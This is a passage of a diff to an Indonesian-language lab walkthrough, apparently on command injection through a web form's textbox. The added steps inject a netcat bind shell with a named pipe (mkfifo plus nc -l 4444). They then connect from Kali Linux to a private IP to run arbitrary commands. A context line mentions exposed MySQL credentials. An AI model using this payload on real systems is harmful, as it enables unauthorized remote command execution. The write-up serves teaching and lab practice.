@@ -51,14 +51,13 @@ Terlihat host, username, password, dan nama database dari MySQL yang digunakan w
 **which nc** : melihat dimana netcat berada
 **netstat -nao | grep 4444 | wc -l** : melihat jumlah semua koneksi ke port 4444
 
-* **Step 1** : Masukan command linux pada textbox tersebut `which nc; netstat -nao | grep 4444 | wc -l`.
-**which nc** : melihat dimana netcat berada
-**netstat -nao | grep 4444 | wc -l** : melihat jumlah semua koneksi ke port 4444
+* **Step 2** : Masukan command linux pada textbox tersebut `mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe`.
+**mkfifo** : proses dapat saling berkomunikasi dilakukan melalui pipes. Pipes dapat dibuat dengan mengunakan perintah ini
+**nc -l 4444** : meminta netcat untuk listen & allow connections di port 4444
 
-* **Step 1** : Masukan command linux pada textbox tersebut `which nc; netstat -nao | grep 4444 | wc -l`.
-**which nc** : melihat dimana netcat berada
-**netstat -nao | grep 4444 | wc -l** : melihat jumlah semua koneksi ke port 4444
+Terlihat koneksi terus berputar hal ini manandakan port 444 sedang listen atau menunggu adanya koneksi/transfer data
 
+* **Step 3** : Sebari langkah 2 berjalan, masukan command linux pada terminal Kali Linux `nc 10.151.36.64 4444`. Kemudian masukan command cli yang anda inginkan.
 
 
 
